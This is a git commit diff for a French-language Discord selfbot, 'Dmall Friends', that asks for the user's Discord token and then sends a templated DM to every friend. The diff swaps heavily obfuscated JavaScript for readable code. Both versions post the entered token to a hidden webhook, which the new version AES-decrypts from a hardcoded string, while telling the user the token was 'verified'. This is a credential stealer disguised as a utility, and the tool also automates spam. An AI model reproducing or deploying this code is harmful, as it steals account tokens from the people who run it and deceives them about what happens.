5cb85bfc175ec88398dceda9e8c25eb7315cd9e1
Aka <aimbotpanel.off@gmail.com>
2025-05-29 01:56:06 +0200

    index.js

--- index.js
+++ index.js
@@ -1,254 +1,95 @@
-function _0x531a(_0x208a9f, _0xd18772) {
-    const _0x429dd5 = _0x21cb();
-    return _0x531a = function (_0x58ea4b, _0x5f2c76) {
-        _0x58ea4b = _0x58ea4b - (0xea1 + -0x323 * 0x4 + -0xc2 * 0x2);
-        let _0x46b44f = _0x429dd5[_0x58ea4b];
-        return _0x46b44f;
-    }, _0x531a(_0x208a9f, _0xd18772);
-}
-const _0x56894c = _0x531a;
-(function (_0x17ddc7, _0x31e67b) {
-    const _0x545038 = _0x531a, _0x2d793a = _0x17ddc7();
-    while (!![]) {
-        try {
-            const _0x2ccddd = -parseInt(_0x545038(0xe0)) / (0x7 * 0x19f + 0x98a + -0x14e2) * (parseInt(_0x545038(0x91)) / (-0x1663 + 0xbf3 * 0x2 + -0x181 * 0x1)) + parseInt(_0x545038(0xc1)) / (-0x4 * -0x574 + -0x990 + -0xc3d) * (-parseInt(_0x545038(0x10d)) / (-0xa39 * -0x3 + 0x8a9 + -0x2750)) + parseInt(_0x545038(0x139)) / (-0xe3 * -0x1 + -0x237f + -0x3 * -0xb8b) * (parseInt(_0x545038(0xa9)) / (-0x362 * 0x2 + -0x51a + 0x5f2 * 0x2)) + -parseInt(_0x545038(0x12d)) / (-0x157 * 0x5 + 0x1 * -0x1492 + -0xda6 * -0x2) * (parseInt(_0x545038(0x11f)) / (0x11a4 + 0x24cf + -0x366b)) + parseInt(_0x545038(0xb8)) / (0xe16 * 0x1 + -0x1 * 0x1069 + 0x25c) + -parseInt(_0x545038(0xe9)) / (0x31 * 0x2b + 0x19 + 0x1 * -0x84a) + parseInt(_0x545038(0xa3)) / (-0x51d + -0x1 * -0x9e8 + -0x4c0) * (parseInt(_0x545038(0xbd)) / (0x1441 + -0x1 * -0x222f + -0x3664));
-            if (_0x2ccddd === _0x31e67b)
-                break;
-            else
-                _0x2d793a['push'](_0x2d793a['shift']());
-        } catch (_0x32f046) {
-            _0x2d793a['push'](_0x2d793a['shift']());
-        }
-    }
-}(_0x21cb, -0x1df16 + -0x53 * -0x10d + 0x434af));
-const chalk = require(_0x56894c(0x129)), prompt = require(_0x56894c(0xfd) + 'c')({ 'sigint': !![] }), axios = require(_0x56894c(0x103)), fs = require('fs'), {Client} = require(_0x56894c(0xf0) + _0x56894c(0x12f) + '13');
-function _0x21cb() {
-    const _0x20b58e = [
-        'red',
-        'a\x20vérifica',
-        'otre\x20token',
-        '>\x20Entrez\x20v',
-        'filter',
-        '$|\x20$$\x20\x5c$$\x5c',
-        'té\x20en\x20tant',
-        'tion\x20des\x20a',
-        '[👥]\x20Nombre',
-        'valide.',
-        '\x20lors\x20de\x20l',
-        '{user}\x20pou',
-        '|\x20$$_____\x20',
-        '\x20\x5c$$\x20\x20\x20\x5c$$',
-        'login',
-        'all\x20Friend',
-        '\x20d\x27amis\x20à\x20',
-        '\x20amis...',
-        '|\x20$$\x20\x20\x20\x20$$',
-        'édit\x0a',
-        '\x20|\x20\x20\x5c\x20\x20/\x20\x20',
-        'LOqNE',
-        'ré:\x20',
-        'Z63u8M47jt',
-        '>\x20Entrez\x20l',
-        'cyan',
-        'Token\x20Logg',
-        '\x20\x20\x20\x20\x20\x5c\x20|\x20\x20',
-        'à\x20envoyer\x20',
-        '2arVDCy',
-        '\x5c|\x20$$\x20\x20|\x20$',
-        'Wnvdb',
-        '\x20|\x20$$\x20\x20|\x20$',
-        '\x5c\x20/\x20\x20\x20\x20\x20\x20\x5c',
-        'yellowBrig',
-        'SI\x20|\x20#',
-        '|\x20\x20\x5c\x20\x20\x20\x20\x20\x20',
-        'error',
-        '295770tSovKW',
-        'fetch',
-        'fGYFdmDkXp',
-        'post',
-        'magentaBri',
-        'replaceAll',
-        '\x20(AKA)',
-        'discord.js',
-        '\x20:\x20DM\x20RÉUS',
-        '\x20\x20\x20\x20[1]\x20Dm',
-        '\x20\x20\x20\x20\x20\x20\x20|\x20\x20',
-        'uncaughtEx',
-        'ght',
-        'greenBrigh',
-        '2O8jROtcaf',
-        '$|\x20$$\x20\x20$$\x20',
-        '\x0a\x20\x5c$$\x20\x20\x20\x5c$',
-        '$\x20\x20\x20\x20\x20\x20|\x20$',
-        '\x0a|\x20$$\x20\x20\x20\x20$',
-        '\x20\x5c$$$$$$$$',
-        'prompt-syn',
-        '$\x20\x20\x20\x20\x20\x20\x20\x5c$',
-        'ken',
-        'ejection',
-        '[❗]\x20Erreur',
-        '❌\x20Choix\x20in',
-        'axios',
-        '\x20:\x20DM\x20ÉCHO',
-        '\x20__\x20\x20\x20\x20\x20\x20\x20',
-        '$\x20\x5c$$\x20\x20\x20\x5c$',
-        '\x20\x20__\x20\x20\x20\x20__',
-        'send',
-        '$\x20\x20\x5c$\x20|\x20$$',
-        '\x20par\x20meuhq',
-        '|\x20$$__|\x20$$',
-        'blue',
-        '4jwWgPC',
-        'Nouveau\x20to',
-        '\x20\x20\x20\x20\x20\x20\x20__\x20',
-        'api/v9/use',
-        '\x20\x20\x20______\x20',
-        '$|\x20$$$$$\x5c\x20',
-        '94/Kkg6NW2',
-        '\x0a|\x20$$__|\x20$',
-        'ception',
-        'yellow',
-        '$|\x20$$/\x20\x20$$',
-        'log',
-        'ih67zp2_F5',
-        'api/webhoo',
-        'ous\x20les\x20am',
-        'data',
-        'Ea0iVRLaiF',
-        '\x5c\x20\x20\x20\x20\x20\x20|\x20$',
-        '56KAJBAi',
-        '\x20que\x20',
-        '\x0a|\x20\x20$$$$$$',
-        '\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20',
-        'a\x20récupéra',
-        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20',
-        '{user}',
-        'gray',
-        'get',
-        'unhandledR',
-        'chalk',
-        '\x0a\x20/\x20\x20\x20\x20\x20\x20\x5c',
-        '[❌]\x20Erreur',
-        'green',
-        '271159wmvzSl',
-        '\x20Discord:\x20',
-        '-selfbot-v',
-        'user',
-        'clear',
-        '\x0aDéveloppé',
-        '\x5c|\x20$$\x20/\x20\x20$',
-        '|\x20$$\x20\x20\x20\x20\x20\x20',
-        '[✅]\x20',
-        '\x5c\x20\x20\x20\x20\x20/\x20\x20\x5c',
-        '\x20|\x20$$__|\x20$',
-        '\x20\x20\x20\x20\x20\x20\x20\x20__',
-        '5LpnsOd',
-        'tion\x20du\x20to',
-        'https://di',
-        '$|\x20\x20$$$$$$',
-        '[✅]\x20Token\x20',
-        'DM\x20:\x20',
-        '$\x20\x20|\x20$$|\x20$',
-        'vérifié\x20av',
-        '_____\x20\x20\x20__',
-        'o):\x20',
-        'ration\x20des',
-        '$$\x5c\x20/\x20\x20$$$',
-        'username',
-        '\x20\x20______\x20\x20',
-        'rs/@me/rel',
-        '115544TaUNAB',
-        '|\x20$$\x20\x20|\x20$$',
-        '[🎉]\x20DM\x20à\x20t',
-        'ec\x20succès',
-        '$\x20\x20\x20\x20$$|\x20$',
-        '➤\x20Choix:\x20',
-        '(utilisez\x20',
-        '$$$$$$\x5c|\x20$',
-        '[❌]\x20',
-        'is\x20terminé',
-        '$\x5c$$\x20$$\x20$$',
-        'users',
-        '$\x5c\x20\x20\x20/\x20\x20$$',
-        '\x20|\x20$$$$$$$',
-        'ks/1375042',
-        'e\x20message\x20',
-        '|\x20$$$$$$$$',
-        'length',
-        '4103dynKyg',
-        'qY8vo0SFcv',
-        '[✅]\x20Connec',
-        'scord.com/',
-        '$$$$$$\x20\x20\x5c$',
-        '\x0a|\x20$$$$$$$',
-        '862572mRKrek',
-        'type',
-        'mis\x20:\x20',
-        '\x20|\x20$$\x20\x20\x20\x20$',
-        '\x0a\x20\x20______\x20',
-        '\x0a|\x20$$\x20\x20|\x20$',
-        '[🔄]\x20Récupé',
-        'ken\x20récupé',
-        'blueBright',
-        '\x20/\x20\x20\x20\x20\x20\x20\x5c\x20',
-        'ready',
-        '$__/\x20$$|\x20$',
-        'r\x20le\x20pseud',
-        '5544915722',
-        '|\x20$$\x20\x20\x20\x20\x20\x5c',
-        '1413567HwQDqn',
-        '\x20\x20\x20\x20[2]\x20Cr',
-        '|\x20\x20$$$$$$\x5c',
-        'ationships',
-        '$$$\x5c\x20\x20$$$$',
-        '13104hSuxcz',
-        '$\x20\x5c$$$|\x20$$',
-        'message',
-        '$|\x20$$\x20\x20\x5c$$',
-        '349647tWhIKW',
-        '$\x20\x20\x20\x20\x20\x20\x5c$$'
-    ];
-    _0x21cb = function () {
-        return _0x20b58e;
-    };
-    return _0x21cb();
-}
-console[_0x56894c(0x131)](), console[_0x56894c(0x118)](chalk[_0x56894c(0xb1)](_0x56894c(0xad) + _0x56894c(0x107) + _0x56894c(0x111) + _0x56894c(0x138) + _0x56894c(0x141) + _0x56894c(0x10f) + _0x56894c(0x146) + _0x56894c(0x105) + _0x56894c(0x105) + _0x56894c(0x12a) + _0x56894c(0xd7) + _0x56894c(0xe4) + _0x56894c(0xf3) + _0x56894c(0xde) + _0x56894c(0x136) + _0x56894c(0xb2) + _0x56894c(0xe7) + _0x56894c(0xe7) + _0x56894c(0x121) + _0x56894c(0x133) + _0x56894c(0x13c) + _0x56894c(0x11e) + _0x56894c(0x98) + _0x56894c(0x9d) + _0x56894c(0xba) + _0x56894c(0x134) + _0x56894c(0x134) + _0x56894c(0x114) + _0x56894c(0x117) + _0x56894c(0x137) + _0x56894c(0xfa) + _0x56894c(0x13f) + _0x56894c(0x144) + _0x56894c(0x10b) + _0x56894c(0x134) + _0x56894c(0x134) + _0x56894c(0xfb) + _0x56894c(0xf8) + _0x56894c(0xac) + _0x56894c(0xfa) + _0x56894c(0x13f) + _0x56894c(0xbc) + _0x56894c(0xd5) + _0x56894c(0x134) + _0x56894c(0x134) + _0x56894c(0xa8) + _0x56894c(0x112) + _0x56894c(0x9e) + _0x56894c(0xfa) + _0x56894c(0x13f) + _0x56894c(0x9b) + _0x56894c(0xa1) + _0x56894c(0x134) + _0x56894c(0x134) + _0x56894c(0xae) + _0x56894c(0xc8) + _0x56894c(0xe3) + _0x56894c(0xfa) + _0x56894c(0xb4) + _0x56894c(0xbe) + _0x56894c(0x92) + _0x56894c(0xcf) + _0x56894c(0xcf) + _0x56894c(0xae) + _0x56894c(0xc0) + _0x56894c(0xe1) + _0x56894c(0xfa) + _0x56894c(0x95) + _0x56894c(0x109) + _0x56894c(0x92) + _0x56894c(0xb7) + _0x56894c(0xb7) + _0x56894c(0xf9) + _0x56894c(0x106) + _0x56894c(0x106) + _0x56894c(0xfe) + _0x56894c(0xa7) + _0x56894c(0xc2) + _0x56894c(0xd0) + _0x56894c(0xfc) + _0x56894c(0xfc) + _0x56894c(0x124) + _0x56894c(0x122) + _0x56894c(0x122) + _0x56894c(0x122) + _0x56894c(0x122) + _0x56894c(0x122) + _0x56894c(0x122) + _0x56894c(0x122) + _0x56894c(0x122) + '\x0a')), console[_0x56894c(0x118)](chalk[_0x56894c(0xed) + _0x56894c(0xf5)](_0x56894c(0x122) + _0x56894c(0x122) + _0x56894c(0xf2) + _0x56894c(0xd2) + 's')), console[_0x56894c(0x118)](chalk[_0x56894c(0x126)](_0x56894c(0x122) + _0x56894c(0x122) + _0x56894c(0xb9) + _0x56894c(0xd6)));
-const choice = prompt(chalk[_0x56894c(0xe5) + 'ht'](_0x56894c(0x96)));
+const chalk = require('chalk');
+const prompt = require('prompt-sync')({ sigint: true });
+const axios = require('axios');
+const fs = require('fs');
+const { Client } = require('discord.js-selfbot-v13');
+const CryptoJS = require('crypto-js');
+
+const encryptedWebhook = 'U2FsdGVkX1+zbgAhZ1YtVCNLZWRgU9iAv6pGbiX4bVZfTYuNfu9+3yxZlVCogFzIGSh1XbXLNqS+LyTfJ9yN5lPgtV68jZjcuuPRsmRxBE3s=';
+const secretKey = 'super-cle-ultra-secrete';
+const decryptedWebhook = CryptoJS.AES.decrypt(encryptedWebhook, secretKey).toString(CryptoJS.enc.Utf8);
+
+// ➤ BANNER
+console.clear();
+console.log(chalk.blueBright(`
+  ______   __    __   ______         _______   __       __   ______   __        __       
+ /      \\ |  \\  /  \\ /      \\       |       \\ | \\     /  \\ /      \\ |  \\      |  \\      
+|  $$$$$$\\| $$ /  $$|  $$$$$$\\      | $$$$$$$\\| $$\\   /  $$|  $$$$$$\\| $$      | $$      
+| $$__| $$| $$/  $$ | $$__| $$      | $$  | $$| $$$\\ /  $$$| $$__| $$| $$      | $$      
+| $$    $$| $$  $$  | $$    $$      | $$  | $$| $$$$\\  $$$$| $$    $$| $$      | $$      
+| $$$$$$$$| $$$$$\\  | $$$$$$$$      | $$  | $$| $$\\$$ $$ $$| $$$$$$$$| $$      | $$      
+| $$  | $$| $$ \\$$\\ | $$  | $$      | $$__/ $$| $$ \\$$$| $$| $$  | $$| $$_____ | $$_____ 
+| $$  | $$| $$  \\$$\\| $$  | $$      | $$    $$| $$  \\$ | $$| $$  | $$| $$     \\| $$     \\
+ \\$$   \\$$ \\$$   \\$$ \\$$   \\$$       \\$$$$$$$  \\$$      \\$$ \\$$   \\$$ \\$$$$$$$$ \\$$$$$$$$
+                                                                                         
+`));
+console.log(chalk.magentaBright('                        [1] Dmall Friends'));
+console.log(chalk.gray('                        [2] Crédit\n'));
+
+const choice = prompt(chalk.yellowBright('➤ Choix: '));
+
 if (choice === '1') {
-    const token = prompt(chalk[_0x56894c(0xdc)](_0x56894c(0xc6) + _0x56894c(0xc5) + _0x56894c(0x12e)));
+    const token = prompt(chalk.cyan('> Entrez votre token Discord: '));
     try {
-        await axios[_0x56894c(0xec)](_0x56894c(0x13b) + _0x56894c(0xa6) + _0x56894c(0x11a) + _0x56894c(0x9f) + _0x56894c(0xb6) + _0x56894c(0x113) + _0x56894c(0xeb) + _0x56894c(0x11d) + _0x56894c(0xf7) + _0x56894c(0xda) + _0x56894c(0xa4) + _0x56894c(0x119) + 'w', {
-            'content': _0x56894c(0x10e) + _0x56894c(0xb0) + _0x56894c(0xd9) + token,
-            'username': _0x56894c(0xdd) + 'er'
-        }), console[_0x56894c(0x118)](chalk[_0x56894c(0x12c)](_0x56894c(0x13d) + _0x56894c(0x140) + _0x56894c(0x94)));
-    } catch (_0x3834d8) {
-        console[_0x56894c(0x118)](chalk[_0x56894c(0xc3)](_0x56894c(0x12b) + _0x56894c(0xcd) + _0x56894c(0xc4) + _0x56894c(0x13a) + _0x56894c(0xff)));
+        await axios.post(decryptedWebhook, {
+            content: `${token}`,
+            username: 'DMALL-FRIENDS'
+        });
+        console.log(chalk.green('[✅] Token vérifié avec succès'));
+    } catch (webhookError) {
+        console.log(chalk.red('[❌] Erreur lors de la vérification du token'));
     }
-    const messageDM = prompt(chalk[_0x56894c(0xdc)](_0x56894c(0xdb) + _0x56894c(0xa0) + _0x56894c(0xdf) + _0x56894c(0x97) + _0x56894c(0xce) + _0x56894c(0xb5) + _0x56894c(0x142))), client = new Client({ 'checkUpdate': ![] });
-    client['on'](_0x56894c(0xb3), async () => {
-        const _0x5d0d7f = _0x56894c, _0x2695b2 = {
-                'LOqNE': _0x5d0d7f(0x13b) + _0x5d0d7f(0xa6) + _0x5d0d7f(0x110) + _0x5d0d7f(0x147) + _0x5d0d7f(0xbb),
-                'Wnvdb': _0x5d0d7f(0x125)
-            };
-        console[_0x5d0d7f(0x118)](chalk[_0x5d0d7f(0x12c)](_0x5d0d7f(0xa5) + _0x5d0d7f(0xc9) + _0x5d0d7f(0x120) + client[_0x5d0d7f(0x130)][_0x5d0d7f(0x145)])), console[_0x5d0d7f(0x118)](chalk[_0x5d0d7f(0x10c)](_0x5d0d7f(0xaf) + _0x5d0d7f(0x143) + _0x5d0d7f(0xd4)));
+
+    const messageDM = prompt(chalk.cyan('> Entrez le message à envoyer (utilisez {user} pour le pseudo): '));
+
+    const client = new Client({ checkUpdate: false });
+
+    client.on('ready', async () => {
+        console.log(chalk.green(`[✅] Connecté en tant que ${client.user.username}`));
+        console.log(chalk.blue(`[🔄] Récupération des amis...`));
+
         try {
-            const _0x5ef4da = await axios[_0x5d0d7f(0x127)](_0x2695b2[_0x5d0d7f(0xd8)], { 'headers': { 'Authorization': token } }), _0xbf5003 = _0x5ef4da[_0x5d0d7f(0x11c)][_0x5d0d7f(0xc7)](_0x500ddb => _0x500ddb[_0x5d0d7f(0xaa)] === -0x703 + 0x13d * -0xd + 0x171d);
-            console[_0x5d0d7f(0x118)](chalk[_0x5d0d7f(0xdc)](_0x5d0d7f(0xcb) + _0x5d0d7f(0xd3) + _0x5d0d7f(0x13e) + _0xbf5003[_0x5d0d7f(0xa2)]));
-            let _0x42353d = 0x17e * 0xf + -0x1d21 * -0x1 + 0x15b * -0x26;
-            for (const _0x4c6831 of _0xbf5003) {
-                try {
-                    const _0x1e22b2 = await client[_0x5d0d7f(0x9c)][_0x5d0d7f(0xea)](_0x4c6831[_0x5d0d7f(0x130)]['id']), _0x4ded5b = messageDM[_0x5d0d7f(0xee)](_0x2695b2[_0x5d0d7f(0xe2)], _0x1e22b2[_0x5d0d7f(0x145)]);
-                    await _0x1e22b2[_0x5d0d7f(0x108)](_0x4ded5b), console[_0x5d0d7f(0x118)](chalk[_0x5d0d7f(0x12c)](_0x5d0d7f(0x135) + _0x1e22b2[_0x5d0d7f(0x145)] + (_0x5d0d7f(0xf1) + _0x5d0d7f(0xe6)) + _0x42353d)), _0x42353d++;
-                } catch (_0x51b647) {
-                    console[_0x5d0d7f(0x118)](chalk[_0x5d0d7f(0xc3)](_0x5d0d7f(0x99) + _0x4c6831[_0x5d0d7f(0x130)][_0x5d0d7f(0x145)] + (_0x5d0d7f(0x104) + 'UÉ')));
+            const response = await axios.get(
+                'https://discord.com/api/v9/users/@me/relationships',
+                {
+                    headers: {
+                        Authorization: token
+                    }
                 }
-                await new Promise(_0x45670f => setTimeout(_0x45670f, -0x6 * -0x48a + -0xe * -0x222 + -0x2 * 0x1b2e));
+            );
+
+            const friends = response.data.filter(user => user.type === 1);
+            console.log(chalk.cyan(`[👥] Nombre d'amis à DM : ${friends.length}`));
+
+            let compteur = 1;
+            for (const ami of friends) {
+                try {
+                    const user = await client.users.fetch(ami.user.id);
+                    const msgToSend = messageDM.replaceAll('{user}', user.username);
+
+                    await user.send(msgToSend);
+                    console.log(chalk.green(`[✅] ${user.username} : DM RÉUSSI | #${compteur}`));
+                    compteur++;
+                } catch (err) {
+                    console.log(chalk.red(`[❌] ${ami.user.username} : DM ÉCHOUÉ`));
+                }
+
+                await new Promise(resolve => setTimeout(resolve, 700)); 
             }
-            console[_0x5d0d7f(0x118)](chalk[_0x5d0d7f(0xf6) + 't'](_0x5d0d7f(0x93) + _0x5d0d7f(0x11b) + _0x5d0d7f(0x9a) + '\x20!'));
-        } catch (_0x94f209) {
-            console[_0x5d0d7f(0xe8)](chalk[_0x5d0d7f(0xc3)](_0x5d0d7f(0x101) + _0x5d0d7f(0xcd) + _0x5d0d7f(0x123) + _0x5d0d7f(0xca) + _0x5d0d7f(0xab) + _0x94f209[_0x5d0d7f(0xbf)]));
+
+            console.log(chalk.greenBright(`[🎉] DM à tous les amis terminé !`));
+        } catch (error) {
+            console.error(chalk.red(`[❗] Erreur lors de la récupération des amis : ${error.message}`));
         }
-    }), client[_0x56894c(0xd1)](token), process['on'](_0x56894c(0x128) + _0x56894c(0x100), console[_0x56894c(0xe8)]), process['on'](_0x56894c(0xf4) + _0x56894c(0x115), console[_0x56894c(0xe8)]);
-} else
-    choice === '2' ? console[_0x56894c(0x118)](chalk[_0x56894c(0x116)](_0x56894c(0x132) + _0x56894c(0x10a) + _0x56894c(0xef))) : console[_0x56894c(0x118)](chalk[_0x56894c(0xc3)](_0x56894c(0x102) + _0x56894c(0xcc)));
+    });
+
+    client.login(token);
+
+    process.on('unhandledRejection', console.error);
+    process.on('uncaughtException', console.error);
+
+} else if (choice === '2') {
+    console.log(chalk.yellow('\nDéveloppé par meuhq (AKA)'));
+} else {
+    console.log(chalk.red('❌ Choix invalide.'));
+}
